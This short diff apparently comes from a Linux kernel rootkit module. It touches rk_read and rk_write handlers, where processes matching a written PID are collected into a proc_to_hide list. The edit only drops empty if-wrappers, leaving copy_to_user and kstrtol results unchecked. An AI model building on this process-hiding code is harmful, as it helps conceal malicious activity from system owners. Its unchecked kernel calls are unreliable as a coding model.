@@ -137,7 +137,7 @@ static ssize_t rk_read(struct file *file, char __user *buffer,
 
     temp = (temp - count);
 
-    if(copy_to_user(buffer, module_status, count));
+    copy_to_user(buffer, module_status, count);
 
     if(count == 0)
     {
@@ -188,7 +188,7 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
 
             for_each_process(p)
             {
-                if(kstrtol(pid_s, 10, &pid));
+                kstrtol(pid_s, 10, &pid);
                 if(pid == p->pid)
                 {
                     proc_to_hide[current_pid] = p;
